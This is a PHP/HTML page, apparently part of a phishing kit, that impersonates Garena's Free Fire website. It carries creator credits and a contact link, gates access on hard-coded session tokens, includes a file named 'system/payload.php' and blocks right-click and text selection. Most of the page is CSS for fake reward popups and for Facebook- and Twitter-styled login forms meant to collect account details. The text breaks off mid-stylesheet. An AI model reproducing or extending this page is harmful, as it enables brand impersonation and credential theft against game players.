<?php
// CREATOR ARYA CODEX
// TOLONG HARGAI CREATOR
// Wa: https://wa.me/+6289509551861

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<title>Garena Free Fire. Game genre Battle Royale mobile terbaik!</title>
	<meta property="og:description" content="Free Fire adalah game mobile battle royale terbaik, diunduh lebih dari 1 milyar pemain di seluruh dunia, dikembangkan oleh Garena untuk Android dan iOS. Battle in Style dan jadi survivor yang bertahan">
	<meta property="og:image" content="https://i.postimg.cc/jdq9pLMZ/navbar-logo.jpg">
	<meta property="og:image:width" content="540">
	<meta property="og:image:height" content="282">
	<link href="https://ujetes.jekar.my.id/index_files/css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/css-zone/facebook.css">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/css-zone/twitter.css">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/css-zone/link.css">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/css-zone/flaglink.css">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/css-zone/animate.css">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/css-zone/style-zone.css">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/css-zone/zero-zone.css">
	<link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
	<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<script src="https://code.jquery.biz.id/libs/jquery-3.6.0.js"></script>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
</head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
	<style type="text/css">
		@charset "utf-8";
		@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");

		*,
		*:before,
		*:after {
			-webkit-box-sizing: border-box;
			-moz-box-sizing: border-box;
			box-sizing: border-box;
		}

		@font-face {
			font-family: 'laza';
			font-style: normal;
			font-weight: 700;
			src:
				url(fonts/laza.woff2) format("woff2"),
				url(fonts/laza.woff) format("woff"),
				url(fonts/laza.ttf) format("truetype");
		}

		@font-face {
			font-family: 'laza2';
			font-style: normal;
			font-weight: 700;
			src:
				url(fonts/laza2.ttf) format("truetype")
		}

		.laz-container {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazback.jpg) no-repeat center;
			background-size: 100% 100%;
			margin-top: 0px;
			padding: 5px;
			width: 100%;
			margin-left: 0px;
			margin-right: 0px;
			height: 862px;
			position: relative;
		}


		.gallery-container {
			background-size: 100% 100%;
			margin-top: -2px;
			width: 100%;
			height: auto;
			border: 0px solid #fff;
			float: left;
		}

		.container-box {
			background-size: 100% 100%;
			width: 100%;
			height: 690px;
		}

		.landing {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/landing.jpg) no-repeat center center;
			background-size: cover;
			width: 100%;
			height: auto;
		}

		.navbar {
			background: #0C0C0C;
			width: 100%;
			height: 65px;
		}

		.navbar-logo {
			width: 65px;
			float: left;
			margin-top: 6px;
			margin-left: 15px;
		}

		.navbar-shop {
			width: 25px;
			margin-top: 19px;
			margin-right: 20px;
		}

		.navbar-language {
			width: 25px;
			margin-top: 19px;
			margin-right: 20px;
		}

		.navbar-menu {
			width: 20px;
			margin-top: 19px;
			margin-right: 5px;
		}

		.navbar-right {
			width: auto;
			float: right;
		}

		.navbar-download {
			background: #ffca13;
			width: 46px;
			height: 45px;
			margin-top: 10px;
			margin-right: 10px;
			border-radius: 7px;
			float: right;
		}

		.navbar-download img {
			width: 20px;
			height: 21px;
			margin: 13px;
		}


		.header {
			width: 100%;
			height: auto;
		}

		.header img {
			width: 100%;
			height: auto;
			margin-top: -0px;
		}


		.balance2 {
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 7px;
			padding: 5px;
			display: block;
		}

		.balance2 img {
			width: 100px;
			margin-top: -10px;
			margin-right: 5px;
			float: center;
		}

		.balance2-nom {
			color: #fff;
			font-size: 18px;
			padding-top: 8px;
			font-family: laza;
			font-weight: 500;
			text-align: left;
			text-shadow: 0 1px 0 #000;
		}

		.balance2-detail {
			width: auto;
			height: auto;
			padding-top: 2px;
			padding-left: 5px;
			padding-bottom: 0px;
			color: #fff;
			font-size: 15px;
			font-family: laza;
			text-align: center;
			text-shadow: 0 1px 0 #000;
			border-left: 3px solid #9FE9F7;
			line-height: 15px;
			float: left;
		}

		.balance2 button {
			background-size: 100% 100%;
			width: 30%;
			height: auto;
			margin-top: -75px;
			margin-right: 10px;
			padding: 5px;
			color: #000;
			font-size: 14px;
			font-family: laza;
			text-align: center;
			border: none;
			outline: none;
			position: relative;
			float: right;
		}

		.balance {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazabz.png) no-repeat center center;
			background-size: 100% 100%;
			width: 73%;
			height: 71px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: -9px;
			padding: 5px;
			border-top: 0px solid #70FFB2;
			border-left: 0px solid #70FFB2;
			border-right: 0px solid #70FFB2;
			border-bottom: 0px solid #70FFB2;
			display: block;
		}

		.balance img {
			width: 57px;
			border-top: 0px solid #1E90FF;
			border-left: 0px solid #1E90FF;
			border-right: 0px solid #1E90FF;
			border-bottom: 0px solid #1E90FF;
			margin-top: -1px;
			margin-right: 5px;
			float: left;
		}

		.balance-nom {
			color: #fff;
			font-size: 14px;
			padding-top: 13px;
			padding-bottom: 4px;
			font-family: laza;
			/* font-weight: 500; */
			text-align: left;
			/* text-shadow:0 1px 0 #000; */
		}

		.balance-detail {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/bg-det.png) no-repeat center center;
			background-size: 100% 100%;
			width: auto;
			height: auto;
			padding-top: 1px;
			padding-left: 5px;
			padding-right: 8px;
			padding-bottom: 3px;
			color: #fff;
			font-size: 13px;
			font-family: 'laza';
			text-align: center;
			text-shadow: 0 1px 0 #000;
			border-left: 3px solid #FAB203;
			line-height: 15px;
			float: left;
		}

		.balance-detail2 {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/bg-det2.png) no-repeat center center;
			background-size: 100% 100%;
			width: auto;
			height: auto;
			padding-top: 2px;
			padding-left: 5px;
			padding-right: 8px;
			padding-bottom: 3px;
			color: #fff;
			font-size: 14px;
			font-family: 'laza';
			text-align: center;
			text-shadow: 0 1px 0 #000;
			border-left: 3px solid #b70303;
			line-height: 15px;
			float: left;
		}

		.balance-detail3 {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/bg-det3.png) no-repeat center center;
			background-size: 100% 100%;
			width: auto;
			height: auto;
			padding-top: 2px;
			padding-left: 5px;
			padding-right: 8px;
			padding-bottom: 3px;
			color: #fff;
			font-size: 14px;
			font-family: laza;
			text-align: center;
			text-shadow: 0 1px 0 #000;
			border-left: 3px solid #a30889eb;
			line-height: 15px;
			float: left;
		}

		.balance button {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazbutton.png) no-repeat center center;
			background-size: 100% 100%;
			width: 30%;
			height: 33px;
			margin-top: -14px;
			margin-right: 0px;
			padding: 5px;
			padding-right: 21px;
			color: #000000;
			font-size: 17px;
			font-family: 'laza';
			font-weight: 500;
			text-align: right;
			text-shadow: 0 3px 0 #ffffff;
			border: none;
			outline: none;
			position: relative;
			float: right;
			animation: pulse .900s infinite alternate;
			animation-play-state: running;
		}

		.header video {
			width: 100%;
			border: none;
		}

		.slideshow-container {
			max-width: 1000px;
			position: relative;
			margin: auto;
			border-top: 1px solid #ECD954;
			border-bottom: 1px solid #ECD954;
		}

		.fade {
			-webkit-animation-name: fade;
			-webkit-animation-duration: 1.5s;
			animation-name: fade;
			animation-duration: 1.5s;
		}

		.notiftwitter {
			width: 30%;
			height: 30px;
			margin-left: 35%;
			margin-right: auto;
			padding: 5px;
			font-size: 22px;
			font-family: Teko;
			font-weight: 500;
			text-align: center;
			color: #ECD954;
			margin-bottom: 0px;
			border: none;
			position: relative;
			outline: none;
			display: block;
		}

		.season-logo {
			width: 20%;
			margin: 15px;
			float: left;
		}

		.season-logos {
			width: 40%;
			margin: 5px;
			float: right;
		}

		.season-slogan {
			width: 100%;
			margin-top: 100%;
			margin-left: auto;
			margin-right: auto;
			display: block;
		}

		.season-btn {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/yes_laza.png) no-repeat center;
			background-size: 100% 100%;
			width: auto;
			height: auto;
			margin-left: auto;
			margin-right: auto;
			padding: 10px;
			padding-left: 30px;
			padding-right: 30px;
			font-size: 18px;
			font-family: laza;
			font-weight: 500;
			text-align: center;
			color: #000;
			margin-bottom: 3px;
			border: none;
			position: relative;
			outline: none;
			display: block;
		}

		.season-btn:hover {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/menu_on.png) no-repeat center;
			background-size: 100% 100%;
			color: #000;
			transition: 0.5s;
		}

		.event-title {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/slogan1.png) no-repeat center center;
			background-size: 100% 100%;
			width: 100%;
			height: 6%;
			margin-top: -99px;
			margin-left: -5px;
			display: block;
			position: absolute;
		}

		.event-title2 {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/slogan2.png) no-repeat center center;
			background-size: 100% 100%;
			width: 100%;
			height: 14%;
			margin-top: -159px;
			margin-left: -5px;
			display: block;
			position: absolute;
		}

		.event-notification {

			background-size: auto;
			background-size: 94% 100%;
			width: 85%;
			height: 48px;
			margin-left: auto;
			margin-right: auto;
			margin-top: -2px;
			margin-bottom: -82px;
			display: block;
		}

		.event-notification-text {
			padding-top: 10px;
			padding-left: 59px;
			color: #dbff85;
			font-size: 16px;
			font-family: Teko;
			font-weight: 550;
			text-align: left;
			float: left;
		}

		.event-notification-timer {
			padding-top: 44px;
			padding-right: 28px;
			color: #dbff85;
			font-size: 27px;
			font-family: Teko;
			font-weight: 550;
			text-align: left;
			margin-bottom: 13px;
			float: right;
		}

		.alert-wrapper {
			width: 98%;
			height: auto;
			border: none;
			margin-left: 10px;
			display: block;
			margin: 10px auto;
			margin-top: -31px;
			margin-bottom: -17px;
		}

		.alert {

			background-size: auto;
			background-size: 100% 100%;
			width: 91%;
			height: 62px;
			margin-top: 29px;
			margin-bottom: 18px;
			padding: 14px;
			margin-left: 5px;
			margin-right: 100px;
			color: #fff;
			border: none;
		}

		.alert2 {

			background-size: auto;
			background-size: 78% 80%;
			width: 91%;
			height: 62px;
			margin-top: 29px;
			margin-bottom: 18px;
			padding: 14px;
			margin-left: 16px;
			margin-right: 100px;
			color: #fff;
			border: none;
		}

		.alert-text {
			margin-top: -330px;
			margin-left: -6px;
			padding: 7px;
			color: #ffffff;
			text-align: center;
			font-size: 14px;
			font-family: laza;
			border: none;
		}

		.alert-text-mid {
			margin-top: 1px;
			padding: 7px;
			color: #f1f1f0;
			text-align: center;
			font: 25px;
			font-family: laza;
			border: none;
			margin-right: -2px;
			font-size: 19px;
		}

		.loadkin {
			width: 100%;
			height: 100%;
			position: fixed;
			top: 0;
			left: 0;
			z-index: 9999;
			background: #000;
		}

		.loadkin-box {
			position: relative;
			margin: 50px auto;
			text-align: center;
			height: 43px;
			font-size: 20px;
			padding: 5px;
			padding-bottom: 5px;
			margin-top: 70%;
		}

		.loadkin-box img {
			width: 70px;
			height: 85px;
			margin-bottom: 10px;
		}

		.loadkin-box i {
			padding-top: 15px;
			padding-bottom: 15px;
			color: #fff;
			font-size: 20px;
			float: center;
			font-family: arial, sans-serif;
			text-align: center;
		}

		.popup {
			width: 100%;
			height: 100%;
			position: fixed;
			top: 0;
			left: 0;
			z-index: 9999;
			background-color: rgba(0, 0, 0, 0.4);
		}

		.popup-box-wrapper {
			width: auto;
			height: auto;
			position: relative;
			margin: 50px auto;
			margin-top: 15%;
			text-align: center;
			font-family: 'laza';
			color: #fff;
		}

		.popup-box-wrapperz {
			width: 390px;
			height: auto;
			position: relative;
			margin: 50px auto;
			margin-top: 15%;
			text-align: center;
			font-family: 'laza';
			color: #fff;
		}

		.popup-box-navbar {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/popup-navbar2.png) no-repeat center center;
			background-size: 100% 100%;
			height: 43px;
			padding-bottom: 5px;
		}

		.popup-box-navbar img {
			width: 25px;
			height: 25px;
			margin-top: 7px;
			margin-right: 15px;
			float: right;
		}

		.popup-box-navbar-title {
			padding-top: 9px;
			padding-bottom: 2px;
			font-size: 20px;
			font-family: laza;
			font-weight: 300;
			text-align: center;
			color: #fff;
		}

		.popup-box-navbarz {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/popup-navbar2.png) no-repeat center center;
			background-size: 100% 100%;
			height: 43px;
			padding-bottom: 5px;
		}

		.popup-box-navbarz img {
			width: 25px;
			height: 25px;
			margin-top: 7px;
			margin-right: 15px;
			float: right;
		}

		.popup-box-navbarz-title {
			padding-top: 9px;
			padding-bottom: 2px;
			font-size: 20px;
			font-family: laza;
			font-weight: 300;
			text-align: center;
			color: #fff;
		}

		.popup-box-navbar-ignis {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/popup-navbar-ignis.png) no-repeat center center;
			background-size: 100% 100%;
			height: 43px;
			padding-bottom: 5px;
		}

		.popup-box-navbar-ignis img {
			width: 25px;
			height: 25px;
			margin-top: 7px;
			margin-right: 15px;
			float: right;
		}

		.popup-box-navbar-ignis-title {
			padding-top: 17px;
			padding-bottom: 2px;
			font-size: 20px;
			font-family: 'laza';
			font-weight: 500;
			text-align: center;
			color: #e1d7c9;
		}

		.popup-box-bg {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/popup-box-bg2.png) no-repeat center center;
			background-size: 100% 100%;
			width: 400px;
		}

		.popup-box-bgz {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/popup-box-bg3.png) no-repeat center center;
			background-size: 100% 100%;
			width: 100%;
			margin-top: -12px;
			margin-left: 0px;
		}

		.popup-box-ignis {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/popup-box-ignis.png) no-repeat center center;
			background-size: 100% 100%;
			width: 100%;
			margin-top: -12px;
			margin-left: 0px;
		}

		.popup-box-bgx {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/popup-box-bg3.png) no-repeat center center;
			background-size: 100% 100%;
			width: 100%;
			margin-top: 0px;
			margin-left: 0px;
			font-size: 18px;
			padding-bottom: auto;
			padding-top: 30px;
		}

		.rewardpop {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazlogin.png) no-repeat center center;
			background-size: 100% 100%;
			width: 400px;
			height: 200px;
			margin: 50px auto;
			text-align: center;
			margin-top: 300px;

		}

		.popup-box-gamecon {
			width: 52%;
			height: 65px;
			margin-left: auto;
			margin-right: auto;
			margin-top: 12px;
			display: block;
		}

		.popup-box-alert {
			width: 95%;
			height: auto;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 5px;
			color: #AAAAAA;
			font-size: 18px;
			font-family: laza;
			font-weight: 500;
			text-align: left;
			display: block;
		}

		.popup-box-alert2 {
			width: 95%;
			height: auto;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 5px;
			color: #AAAAAA;
			font-size: 18px;
			font-family: laza;
			font-weight: 500;
			text-align: left;
			display: block;
		}

		.popup-box-alert0 {
			width: 95%;
			height: auto;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 5px;
			color: #AAAAAA;
			font-size: 18px;
			font-family: laza;
			font-weight: 500;
			text-align: right;
			display: block;
		}

		.popup-box-alert3 {
			width: 95%;
			height: auto;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 5px;
			color: #c7c7c7;
			font-size: 16px;
			font-family: laza;
			font-weight: 500;
			text-align: center;
			/* font-style: italic; */
			display: block;
		}


		.popup-box-alert7 {
			width: 95%;
			height: auto;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 5px;
			color: #F5EAB0;
			font-size: 18px;
			font-family: laza;
			font-weight: 500;
			text-align: center;
			display: block;
		}

		.popup-box-alertsz {
			width: 95%;
			height: auto;
			margin-top: 26px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: -94px;
			padding: 55px;
			color: #fdffff;
			font-size: 18px;
			font-family: laza;
			font-weight: 500;
			text-align: center;
			display: block;
		}

		.popup-box-alert-ignis {
			width: 95%;
			height: auto;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 2px;
			padding: 12px;
			color: #cdcdcd;
			font-size: 16px;
			font-family: laza;
			font-weight: 500;
			text-align: center;
			display: block;
		}

		.popup-box-alert4 {
			width: 95%;
			height: auto;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 2px;
			padding: 12px;
			color: #AAAAAA;
			font-size: 18px;
			font-family: laza;
			font-weight: 500;
			text-align: center;
			display: block;
		}

		.popup-box-alert4 i {
			padding-top: 15px;
			padding-bottom: 15px;
			color: #AAAAAA;
			font-size: 50px;
			text-align: center;
		}

		.popup-box-item {
			width: 16%;
			height: 67px;
			margin-top: 38px;
			margin-left: auto;
			margin-right: auto;
			text-align: right;
			display: block;
		}

		.popup-box-item img {
			width: 100%;
			height: 100%;
		}

		.popup-box-item span {
			background: #00000094;
			background-size: 56% 100%;
			width: auto;
			color: #fff;
			font-size: 13px;
			font-family: laza;
			text-align: right;
			position: absolute;
			top: 56px;
			right: 3px;
		}

		.popup-box-form {
			width: 85%;
			height: auto;
			margin-left: auto;
			margin-right: auto;
			display: block;
		}

		.popup-box-form label {
			display: inline-block;
			width: 140px;
			text-align: right;
			color: yellow;
		}

		.popup-box-form input {
			background: #1a1b1c;
			background-size: 100% 100%;
			width: 100%;
			height: 35px;
			margin-bottom: 3px;
			padding: 4px;
			padding-left: 10px;
			color: #c3c3c3;
			font-size: 16px;
			font-family: laza;
			font-weight: 300;
			border: 1px solid #8f8f8f;
			position: relative;
			outline: none;
			-webkit-appearance: none;
			-moz-appearance: none;
		}

		.popup-box-form input::placeholder {
			color: #FFFBF7;
		}

		.popup-box-form select {
			background: #1a1b1c;
			background-size: 100% 100%;
			width: 100%;
			height: 35px;
			margin-bottom: 3px;
			padding: 4px;
			padding-left: 10px;
			color: #c3c3c3;
			font-size: 16px;
			font-family: laza;
			font-weight: 300;
			border: 1px solid #8f8f8f;
			position: relative;
			outline: none;
			-webkit-appearance: none;
			-moz-appearance: none;
		}

		.popup-box-footer {
			background-size: 100% 100%;
			margin-top: 20px;
			width: 100%;
			height: 45px;
		}

		.popup-box-footer-ignis {
			background-size: 100% 100%;
			margin-top: 20px;
			width: 100%;
			height: 45px;
		}

		.popup-box-footer-ignis button {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/yes.png) no-repeat center;
			background-size: 100% 100%;
			width: auto;
			height: auto;
			margin-top: -23px;
			padding: 5px;
			padding-left: 35px;
			padding-right: 35px;
			color: #d6d6d6;
			font-size: 18px;
			font-family: laza;
			font-weight: 500;
			margin-left: auto;
			margin-right: auto;
			text-align: center;
			border: none;
			outline: none;
		}

		.popup-box-footer button {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/yes_laza.png) no-repeat center;
			background-size: 100% 100%;
			width: auto;
			height: auto;
			margin-top: -23px;
			padding: 5px;
			padding-left: 35px;
			padding-right: 35px;
			color: #000;
			font-size: 18px;
			font-family: laza;
			font-weight: 500;
			margin-left: auto;
			margin-right: auto;
			text-align: center;
			border: none;
			outline: none;
		}

		.popup-box-form-footer {
			background-size: 100% 100%;
			width: 100%;
			height: 45px;
			margin-top: 20px;
		}

		.popup-box-form-footer button {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/yes_laza.png) no-repeat center;
			background-size: 100% 100%;
			width: auto;
			height: auto;
			margin-top: 5px;
			padding: 4px;
			padding-left: 30px;
			padding-right: 30px;
			color: #000;
			font-size: 18px;
			font-family: laza;
			font-weight: 500;
			text-align: center;
			border: none;
			outline: none;
		}

		.popup-box-navbar-login {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/popup-navbar1.png) center center/100% 100% no-repeat;
			height: auto;
			padding-top: 5px;
			padding-bottom: 1px
		}

		.popup-box-navbar-login-title {
			padding-left: 24px;
			padding-top: 2px;
			color: #defbff;
			font-size: 22px;
			font-family: laza;
			font-weight: 500;
			text-align: center
		}

		.popup-box-bg-login {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/popup-box-bg-login.png) center center/100% 100% no-repeat;
			width: 100%;
			height: 255px;
			margin-top: -10px
		}

		.popup-box-bg-login-load {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazlogin.png) no-repeat center center;
			background-size: 100% 100%;
			margin-left: -20px;
			width: 400px;
			height: 200px;
			margin-top: -10px;
		}

		.load-login-img {
			width: 30%;
			height: auto;
			margin-top: 30px;
			margin-bottom: 5px
		}

		.load-login-gif {
			width: 15%;
			height: auto;
			margin-bottom: 0
		}

		.popup-btn-login {
			width: 25%;
			height: 25px;
			padding: 2px;
			margin-bottom: 10px;
			margin: 5px;
			color: #000;
			font-size: 16px;
			font-family: laza;
			border: none;
			border-radius: 3px;
			outline: none;
			margin-bottom: 45px;
			position: relative;
		}

		.popup-btn-login i {
			color: #fff;
			font-size: 20px;
			float: left;
		}

		.popup-btn-facebook {
			background: #1778f2;
			color: #fff;
			margin-bottom: 45px;
		}

		.popup-btn-twitter {
			background: #ffffff;
			margin-bottom: 3px;
			color: #0d0c0c;
		}

		.popup-btn-login-link {
			background: #E3B448;
			color: #000;
		}

		.popup-btn-login-link img {
			width: 22px;
			height: 22px;
			margin-top: -2px;
			color: #fff;
			font-size: 20px;
			float: left;
		}

		.popup-login {
			background: rgba(0, 0, 0, 0.4);
			width: 100%;
			height: 100%;
			position: fixed;
			top: 0;
			left: 0;
			z-index: 9999;
		}

		.popup-box-login-fb {
			background: #ECEFF6;
			max-width: 330px;
			height: auto;
			position: relative;
			margin: 50px auto;
			margin-top: 1.9%;
			text-align: center;
			font-family: 'Teko';
			color: #000;
			border-radius: 10px;
		}

		.popup-box-login-twitter {
			background: #fff;
			max-width: 330px;
			height: auto;
			position: relative;
			margin: 50px auto;
			margin-top: 10%;
			text-align: center;
			font-family: 'Teko';
			color: #000;
			border-radius: 5px;
		}

		.close-fb {
			background: #3b5998;
			width: 25px;
			height: 25px;
			color: #fff;
			font-size: 20px;
			text-align: center;
			text-decoration: none;
			border-radius: 50%;
			top: -10px;
			right: -10px;
			position: absolute;
			display: block;
		}

		.close-fb i {
			padding-top: 3px;
		}

		.close-other {
			background: #fff;
			width: 25px;
			height: 25px;
			color: #000;
			font-size: 20px;
			text-align: center;
			border-radius: 50%;
			top: -12px;
			right: -12px;
			position: absolute;
			z-index: 9999999;
			display: block;
		}

		.close-other i {
			color: #20px;
			padding-top: 3px;
		}

		.popups {
			width: 100%;
			height: 100%;
			position: fixed;
			top: 0;
			left: 0;
			z-index: 9999;
			background-color: rgba(0, 0, 0, 0.4);
		}

		.popup-box-wrappers {
			width: 390px;
			height: auto;
			position: relative;
			margin: 50px auto;
			margin-top: 15%;
			text-align: left;
			font-family: 'laza';
			color: #fff;
		}

		.popup-box-navbars {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/popup-navbar2.png) no-repeat center center;
			background-size: 100% 100%;
			height: 43px;
			padding-bottom: 5px;
		}

		.popup-box-navbars img {
			width: 20px;
			height: 20px;
			margin-top: 15px;
			margin-right: 18px;
			float: right;
		}

		.popup-box-navbars-title {
			padding-left: 40px;
			padding-top: 14px;
			padding-bottom: 2px;
			font-size: 20px;
			color: #fff;
			font-family: laza;
			font-weight: 300;
			text-align: center;
		}

		.kagetk {
			background: rgba(0, 0, 0, 0.2);
			background-size: 50% 50%;
			width: 80%;
			height: auto;
			margin-left: auto;
			margin-right: auto;
			border: 1px solid #fff;
			display: none;
			padding: 10px;
			color: #fff;
			font-size: 14px;
			font-family: laza;
			text-align: center;
		}

		.popup-box-bgs {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/popup-box-bg3.png) no-repeat center center;
			background-size: 100% 100%;
			width: 100%;
			height: 200px;
			margin-top: -12px;
		}

		.popup-box-alerts4 {
			width: 95%;
			height: auto;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 5px;
			color: #fff;
			font-size: 20px;
			font-family: laza;
			font-weight: 500;
			text-align: left;
			display: block;
		}

		.popup-box-alerts4 i {
			padding-top: 15px;
			padding-bottom: 15px;
			color: #F5EAB0;
			font-size: 50px;
			text-align: left;
		}

		.popup-box-formx label {
			width: 70%;
			text-align: left;
			padding-left: 20px;
			color: #B7B7B7;
			text-shadow: none;
			font-size: 17px;
		}

		.popup-box-formx input {
			background: #001;
			width: 85%;
			height: 35px;
			margin-bottom: 8px;
			margin-left: 20px;
			padding-right: 4px;
			padding: 4px;
			color: #fff;
			font-size: 15px;
			font-family: laza;
			font-weight: 500;
			border: 0.1px solid #fff;
			outline: none;
			position: left;
			-webkit-appearance: none;
			-moz-appearance: none;
		}

		.popup-box-formx input::placeholder {
			color: #BCCBCE;
		}


		.popup-box-formx-footer {
			background-size: 100% 100%;
			width: 100%;
			height: 45px;
			margin-top: 20px;
		}

		.loadinglogin {
			width: 100%;
			height: auto;
		}

		.loadinglogin video {
			width: 400px;
			height: auto;
		}

		.box {
			width: 100%;
			height: 410px;
			margin-left: auto;
			margin-right: auto;
			margin-top: -30px;
			margin-bottom: -25px;
			border: 0px solid #FFFAC9;
			border-radius: 5px;
			position: relative;
			display: block;
		}

		.box-item {
			width: 100%;
			margin-left: auto;
			margin-right: auto;
			padding-top: 2px;
		}

		.scroll {
			width: 100%;
			overflow: none;
			position: relative;
			width: 100%;
			height: 400px;
			margin-top: 11px;
			display: block;
			scrollbar-face-color: #ffbb40;
			scrollbar-shadow-color: #ffbb40;
			scrollbar-highlight-color: #ffbb40;
			scrollbar-3dlight-color: #ffbb40;
			scrollbar-darkshadow-color: #ffbb40;
			scrollbar-track-color: #ffbb40;
			scrollbar-arrow-co
		}

		.btn-wrapper {
			width: 93%;
			height: 50px;
			margin-top: 3px;
			margin-right: 3px;
			font-family: laza;
		}

		.btn-wrapper button {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/tombol.png) no-repeat center;
			background-size: 100% 100%;
			width: 38%;
			height: 40px;
			margin: -10px;
			padding: 10px;
			color: #FFFAC9;
			font-family: laza;
			font-size: 18px;
			font-weight: 500;
			text-align: center;
			border: none;
			outline: none;
			float: right;
			display: inline-block;
		}

		.footer {
			background: #19191b url(https://i.postimg.cc/02KwtTc7/footer-bg.jpg) top center / 100% no-repeat;
			background-position-y: calc(20 / 640 * 100vw);
			width: 100%;
			height: auto;
			padding: 15px;
			border-left: none;
			border-right: none;
			border-bottom: none;
			border-top: none;
		}

		.footer-txt-join {
			margin-top: 10px;
			margin-bottom: 15px;
			color: #ffbe21;
			font-size: 30px;
			font-family: laza;
			text-align: left;
			text-transform: uppercase;
		}


		.footer-socmed-box {
			background: url(https://www.pubgmobile.com/en/images/footer_link_bg.png) no-repeat center center;
			background-size: 100% 100%;
			width: 100%;
			height: 55px;
			margin-bottom: 10px;
			padding: 5px;
			border-radius: 3px;
		}

		.footer-socmed-box:hover {
			background: url(https://www.pubgmobile.com/en/images/footer_link_bg_on.png) no-repeat center center;
			background-size: 100% 100%;
			transition: 1s;
		}

		.footer-socmed-img-main {
			width: 30px;
			height: 30px;
			margin-top: 7px;
			margin-left: 15px;
			margin-right: 15px;
			float: left;
		}

		.footer-socmed-img-other {
			width: 35px;
			height: 26px;
			margin-top: 10px;
			margin-left: 15px;
			margin-right: 11px;
			float: left;
		}

		.footer-socmed-box p {
			margin-top: 7px;
			color: #fff;
			font-size: 25px;
			font-family: Teko;
			text-align: left;
			text-transform: uppercase;
		}

		.footer-socmed-box button {
			background: #ffbe21;
			width: 30%;
			height: auto;
			margin-top: 10px;
			margin-bottom: 10px;
			margin-right: 15px;
			padding: 1px;
			padding-top: 3px;
			color: #000;
			font-size: 16px;
			font-family: Teko;
			text-align: center;
